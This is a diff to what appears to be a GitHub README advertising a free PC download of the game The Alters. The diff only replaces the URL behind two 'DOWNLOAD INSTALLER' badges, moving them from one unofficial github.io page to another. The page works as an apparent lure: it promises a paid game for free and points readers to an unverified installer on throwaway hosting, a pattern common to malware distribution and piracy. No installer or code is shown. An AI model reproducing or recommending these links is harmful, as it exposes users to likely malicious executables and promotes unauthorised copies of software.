@@ -1,6 +1,6 @@
 # The Alters — Free Download 
 
-[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://ryadikmntiiks.github.io/.github/THEAL)
+[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://The-Alters-PC-Download.github.io/.github)
 
 ## 🧬 About the Game
 
@@ -27,7 +27,7 @@ Now you can **download The Alters on PC**, without the need for an internet conn
 
 ## 🟢 Download Installer
 
-[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://ryadikmntiiks.github.io/.github/THEAL)
+[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://The-Alters-PC-Download.github.io/.github)
 
 ---
 
